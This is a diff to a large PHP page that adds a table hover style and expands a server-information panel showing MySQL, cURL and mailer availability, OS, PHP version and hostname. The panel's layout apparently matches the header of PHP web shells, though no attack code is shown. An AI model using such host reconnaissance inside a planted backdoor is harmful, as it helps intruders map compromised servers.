@@ -391,6 +391,10 @@ input[type="submit"]:hover {
     background-color: #45a049;
 }
 
+table tr:hover {
+    background-color: #ffb4b4; /* Warna latar belakang saat hover */
+    cursor: pointer; /* Mengubah kursor menjadi pointer */
+}
 
 
     </style>
@@ -1017,11 +1021,31 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <?php
 // Menampilkan informasi server
 echo "<h1>Informasi Server</h1>";
+
+if (function_exists('mysqli_connect')) {
+    echo "<p><strong>MySQL:</strong> ON | ";
+} else {
+    echo "<p><strong>MySQL:</strong> OFF | ";
+}
+
+if (function_exists('curl_version')) {
+    $curl_info = curl_version();
+    echo "<strong>cURL:</strong> ON | ";
+} else {
+    echo "<strong>cURL:</strong> OFF | ";
+}
+if (function_exists('mail')) {
+    echo "<strong>Mailer:</strong> ON | ";
+} else {
+    echo "<strong>Mailer:</strong> OFF | ";
+}
+echo "<strong>OS Server: </strong>" . PHP_OS . " | ";
+echo "<strong>PHP Version:</strong> " . phpversion() . "</p>";
+echo "<p><strong>Name Host Server: </strong>" . gethostname() . "</p>";
 echo "<p><strong>Server Name:</strong> " . $_SERVER['SERVER_NAME'] . " | <strong>Server Address:</strong> " . $_SERVER['SERVER_ADDR'] . "  | <strong>Server Port:</strong> " . $_SERVER['SERVER_PORT'] . "</p>";
 echo "<p><strong>Request Method:</strong> " . $_SERVER['REQUEST_METHOD'] . "  | <strong>Protocol:</strong> " . $_SERVER['SERVER_PROTOCOL'] . "  | <strong>Request Time:</strong> " . date('Y-m-d H:i:s', $_SERVER['REQUEST_TIME']) . " <strong>Timezone:</strong> " . date_default_timezone_get() . "</p>";
 echo "<p><strong>User Agent:</strong> " . $_SERVER['HTTP_USER_AGENT'] . "</p>";
 echo "<p><strong>Remote Address:</strong> " . $_SERVER['REMOTE_ADDR'] . "  | <strong>Server Software:</strong> " . $_SERVER['SERVER_SOFTWARE'] . "</p>";
-echo "<p><strong>PHP Version:</strong> " . phpversion() . "</p>";
 echo "<p><strong>Server Admin:</strong> " . (isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : 'Tidak ada') . "  | <strong>Server Type:</strong> " . (isset($_SERVER['SERVER_TYPE']) ? $_SERVER['SERVER_TYPE'] : 'Tidak ada') . "</p>";
 echo "<p><strong>Connection Status:</strong> " . (isset($_SERVER['CONNECTION']) ? $_SERVER['CONNECTION'] : 'Tidak ada') . "</p>";
 echo "<p><strong>Content Type:</strong> " . (isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : 'Tidak ada') . "</p>";
